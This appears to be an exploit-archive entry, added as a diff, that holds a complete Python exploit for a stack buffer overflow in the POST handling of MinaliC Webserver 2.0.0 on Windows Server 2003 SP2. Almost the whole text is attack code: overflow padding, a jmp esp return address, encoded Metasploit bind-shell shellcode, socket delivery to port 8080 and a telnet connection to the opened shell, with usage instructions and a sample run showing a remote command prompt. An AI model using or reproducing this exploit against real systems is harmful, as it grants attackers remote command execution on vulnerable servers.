@@ -1,0 +1,111 @@
+id: 20672
+date: 04/20/2013
+title: MinaliC Webserver 2.0.0 Buffer Overflow Vulnerability
+author: Antonius
+cves: 
+
+#!/usr/bin/env python
+# Title : MinaliC Webserver 2.0.0 Post Method Remote Command Execution
+# (Works for Windows Server 2003 sp2 Only)
+#
+# Date: 12 Apr 2013
+#
+# Exploit Author: Antonius - (http://www.cr0security.com - http://www.codewall-security.com)
+#
+# Thanks :  http://www.offensive-security.com , http://www.security-hooligan.com, http://www.techorganic.com & Indonesian Backtrack Team
+#
+# Vendor Homepage: http://minalic.sourceforge.net
+#
+# Version: MinaliC Webserver 2.0.0
+#
+# Tested on: Windows Server 2003 Service Pack 2,  English
+#
+# Description:
+# Stack based buffer overflow occur when minalic 2.0.0 handles http post method. This exploit tested and works on windows server 2003 sp2 only.
+# Exploitation will failed if specify wrong path
+# Usage : ./exploit.py ip_address minalic_bin_path
+#cr0security@cr0security-Vostro1310:~/Desktop/ctp_exercise/working_exploit$ python exploit.py 192.168.1.2 'c:\minalic\bin'
+#Sending Exploit Please Wait
+#Trying 192.168.1.2...
+#Connected to 192.168.1.2.
+#Escape character is '^]'.
+#Microsoft Windows [Version 5.2.3790]
+#(C) Copyright 1985-2003 Microsoft Corp.
+#C:\minalic\bin>
+
+import socket, struct,os, sys, time
+
+if len(sys.argv) < 2 :
+  print "MinaliC Webserver Post Method Remote Command Execution (Works for Windows Server 2003 sp2 Only)"
+  print "Usage : ./exploit.py 'ip address' 'path of minalic binary'"  
+  print "Example : python exploit.py 192.168.1.2 'c:\minalic\bin'"
+  sys.exit(1)
+ip = sys.argv[1]
+if len(sys.argv) > 2 :
+  path_length = len(sys.argv[2])
+  path = sys.argv[2]
+else :
+  path_length = 14
+if path_length > 14 :
+  #if path not at C:\minalic\bin we must recalculate preceed length to overwrite eip 
+  junk = "\x90" * (240 - (len(path) - 14))
+else :
+  #default path at C:\minalic\bin
+  junk = "\x90" * 240
+
+#only have 4 bytes, jmp for more
+first_stage = "\xeb\xd0" + "\x90" * 2
+
+#ecx points to our controlled buffer, so we do a jmp to ecx
+second_stage = "\x83\xc1\x04\xff\xe1"
+
+sec2 = junk + second_stage
+
+#0x7C86A01B      jmp esp from ntdll.dll on windows server 2003
+ret = "\x1B\xA0\x86\x7C"
+
+host = "\xff" *  140
+
+# metasploit windows/shell_bind_tcp - 368 bytes
+# http://www.metasploit.com
+# Encoder: x86/shikata_ga_nai
+# VERBOSE=false, LPORT=4444, RHOST=127.0.0.1,
+shellcode = ("\xbd\x78\x69\xd9\xaa\xd9\xc0\xd9\x74\x24\xf4\x58\x2b\xc9" +
+"\xb1\x56\x83\xe8\xfc\x31\x68\x0f\x03\x68\x77\x8b\x2c\x56" +
+"\x6f\xc2\xcf\xa7\x6f\xb5\x46\x42\x5e\xe7\x3d\x06\xf2\x37" +
+"\x35\x4a\xfe\xbc\x1b\x7f\x75\xb0\xb3\x70\x3e\x7f\xe2\xbf" +
+"\xbf\xb1\x2a\x13\x03\xd3\xd6\x6e\x57\x33\xe6\xa0\xaa\x32" +
+"\x2f\xdc\x44\x66\xf8\xaa\xf6\x97\x8d\xef\xca\x96\x41\x64" +
+"\x72\xe1\xe4\xbb\x06\x5b\xe6\xeb\xb6\xd0\xa0\x13\xbd\xbf" +
+"\x10\x25\x12\xdc\x6d\x6c\x1f\x17\x05\x6f\xc9\x69\xe6\x41" +
+"\x35\x25\xd9\x6d\xb8\x37\x1d\x49\x22\x42\x55\xa9\xdf\x55" +
+"\xae\xd3\x3b\xd3\x33\x73\xc8\x43\x90\x85\x1d\x15\x53\x89" +
+"\xea\x51\x3b\x8e\xed\xb6\x37\xaa\x66\x39\x98\x3a\x3c\x1e" +
+"\x3c\x66\xe7\x3f\x65\xc2\x46\x3f\x75\xaa\x37\xe5\xfd\x59" +
+"\x2c\x9f\x5f\x36\x81\x92\x5f\xc6\x8d\xa5\x2c\xf4\x12\x1e" +
+"\xbb\xb4\xdb\xb8\x3c\xba\xf6\x7d\xd2\x45\xf8\x7d\xfa\x81" +
+"\xac\x2d\x94\x20\xcc\xa5\x64\xcc\x19\x69\x35\x62\xf1\xca" +
+"\xe5\xc2\xa1\xa2\xef\xcc\x9e\xd3\x0f\x07\xa9\xd3\xc1\x73" +
+"\xfa\xb3\x23\x84\xed\x1f\xad\x62\x67\xb0\xfb\x3d\x1f\x72" +
+"\xd8\xf5\xb8\x8d\x0a\xaa\x11\x1a\x02\xa4\xa5\x25\x93\xe2" +
+"\x86\x8a\x3b\x65\x5c\xc1\xff\x94\x63\xcc\x57\xde\x5c\x87" +
+"\x22\x8e\x2f\x39\x32\x9b\xc7\xda\xa1\x40\x17\x94\xd9\xde" +
+"\x40\xf1\x2c\x17\x04\xef\x17\x81\x3a\xf2\xce\xea\xfe\x29" +
+"\x33\xf4\xff\xbc\x0f\xd2\xef\x78\x8f\x5e\x5b\xd5\xc6\x08" +
+"\x35\x93\xb0\xfa\xef\x4d\x6e\x55\x67\x0b\x5c\x66\xf1\x14" +
+"\x89\x10\x1d\xa4\x64\x65\x22\x09\xe1\x61\x5b\x77\x91\x8e" +
+"\xb6\x33\xa1\xc4\x9a\x12\x2a\x81\x4f\x27\x37\x32\xba\x64" +
+"\x4e\xb1\x4e\x15\xb5\xa9\x3b\x10\xf1\x6d\xd0\x68\x6a\x18" +
+"\xd6\xdf\x8b\x09")
+
+agent = "User-Agent: " + "\x90" *  (898 -  len(shellcode)) + shellcode
+payload = "POST /" + sec2 + ret + first_stage + " HTTP/1.1\r\n" + "Host: " + host + "\r\n" + agent + "\r\n\r\n"
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((ip, 8080))
+s.send(payload)
+s.close()
+print "Sending Exploit Please Wait"
+time.sleep(15)
+os.system("telnet " + ip + " 4444")
+
+#  0day.today [2023-03-23]  #
